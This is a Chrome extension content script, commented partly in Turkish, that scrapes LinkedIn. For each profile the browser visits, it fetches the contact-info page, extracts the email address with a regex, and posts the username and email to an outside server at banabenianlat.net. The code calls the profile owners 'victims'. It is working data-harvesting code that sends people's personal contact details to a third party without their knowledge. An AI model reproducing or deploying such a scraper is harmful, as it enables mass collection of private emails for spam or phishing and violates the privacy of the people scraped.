// Troubleshooting:
// Remove and reload chrome extension from extensions dashboard

//To-Do:
//Search url'den ve direct profil url'den gelenlere ayrı muamele


console.log("content matched!!!");

// function get_names(){
//     let art_deco = document.getElementsByClassName("artdeco-card");
//     let names = $(".mn-connection-card__name").map( function() {
//         return $(this).text().trim();
//     }).get();
//     return names;
// }

function get_victimname(url){
    return url.substring(url.lastIndexOf("/in/") + 4, url.lastIndexOf("/"));
}

function get_victim_email(victim_name){
    $.ajax({ 
    url: 'https://www.linkedin.com/in/'+victim_name+'/detail/contact-info/', 
    success: function(data) {
        $htmlData = data;
        $email = $htmlData.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi); 
        if($email){
           console.log($email[0]);  
           var postdata_arr = [];
           postdata_arr.push({username:victim_name,email:$email[0]});
            console.log(postdata_arr); 
            $.post("https://banabenianlat.net/ChromeExtensions/LinkedinScraper/create_email.php",
            {
                postdata:postdata_arr
            },
            function(data, status){
                console.log(status);
                console.log(" return data : "+data);
            });
        }      
    } });
}

// Whole page reload ile bir user'a erişilirse onun username'i
var victim1_name = get_victimname(window.location.href);
get_victim_email(victim1_name);

chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
      // listen for messages sent from background.js
      console.log("url change listned");
      if (request.message === 'url_changed!') {
        console.log(request.url) // new url is now in content scripts!
        var victim_name = get_victimname(request.url);
        console.log(victim_name);
        $.ajax({ 
            url: 'https://www.linkedin.com/in/'+victim_name+'/detail/contact-info/', 
            success: function(data) {
                $htmlData = data;
                $email = $htmlData.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi); 
                if($email){
                    var postdata_arr = [];
                    postdata_arr.push({username:victim_name,email:$email[0]});
                   console.log(postdata_arr); 
                   $.post("https://banabenianlat.net/ChromeExtensions/LinkedinScraper/create_email.php",
                   {
                       postdata:postdata_arr
                   },
                   function(data, status){
                       console.log(status);
                        console.log(" return data : "+data);
                   });

                }      
            } });
      }
  });

